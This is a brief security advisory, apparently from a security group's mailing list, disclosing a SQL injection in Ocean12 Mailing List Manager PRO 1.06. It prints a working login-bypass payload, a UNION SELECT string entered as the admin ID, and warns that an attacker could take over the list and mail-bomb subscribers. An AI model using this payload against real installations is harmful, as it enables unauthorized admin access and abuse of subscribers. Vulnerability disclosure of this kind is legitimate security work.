Subject: [HSC Security Group] Ocean12 Mailing List Manager Pro SQL injection




Hackers Center Security Group (http://www.hackerscenter.com/)         
Zinho's Security Advisory          

Desc: SQL injection : Ocean12 Mailing list manager PRO 1.06 
Vendor: www.ocean12scripts.com 
Risk: High  


An sql injection allows anyone to login as admin using this sql query in  the login panel: 

Admin_id: Admin' UNION ALL SELECT   id,id,id,id,id,id,id,id,id,id,id,id,id,id FROM settings WHERE  Admin_id='Admin 
Admin_Password: 1 

Of course this is a serious flaw that can lead to mail bombing anyone  subscribed to the mailing list and taking full control over the list. 


Vendor has been contacted several weeks ago. Noone replied.
